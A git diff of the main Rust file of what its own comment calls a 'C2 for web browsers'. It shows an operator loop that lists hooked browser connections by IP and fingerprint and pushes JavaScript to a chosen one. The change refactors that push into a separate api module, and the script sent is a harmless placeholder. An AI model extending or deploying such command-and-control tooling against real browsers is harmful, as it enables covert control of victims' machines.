@@ -1,17 +1,15 @@
+mod api;
+mod data;
+mod path;
 mod websocket;
 pub mod config;
-mod path;
-mod data;
 
-use std::thread;
-use core::time::Duration;
-use std::sync::{Arc, Mutex};
-use std::io::{stdin, stdout, Write};
-use minify_js::{Session, TopLevelMode, minify};
-use base64::{Engine as _, engine::general_purpose};
 // use clap::{Command, Arg, crate_version, crate_authors, crate_description };
 use clap::Parser;
-
+use core::time::Duration;
+use std::io::{stdin, stdout, Write};
+use std::sync::{Arc, Mutex};
+use std::thread;
 
 /// C2 for web browsers
 #[derive(Parser, Debug)]
@@ -82,7 +80,7 @@ fn test_websocket() {
         if response == "connections" {
 
             for connection in connections.clone().lock().unwrap().iter() {
-                println!("{} - {} - {}", connection.sender.connection_id(), connection.ip, connection.fingerprint);
+                println!("{} - {} - {}", connection.sender.unwrap().connection_id(), connection.ip, connection.fingerprint);
             }
 
         } else if response.contains("send")  {
@@ -90,14 +88,7 @@ fn test_websocket() {
             let splitted_command = response.split(" ");
             let connection_id = splitted_command.last().unwrap();
 
-            let session = Session::new();
-            let mut out = Vec::new();
-            for patata in connections.clone().lock().unwrap().iter() {
-                if patata.clone().sender.connection_id() == connection_id.parse::<u32>().unwrap() {
-                    minify(&session, TopLevelMode::Global, b"const main = () => { let my_first_variable = 1; };", &mut out).unwrap();
-                    let _ = patata.clone().sender.send(general_purpose::STANDARD.encode(out.as_slice()));
-                }
-            }
+            api::send(*connections.lock().unwrap(), String::from("const main = () => { let my_first_variable = 1; };"));
 
         }
 
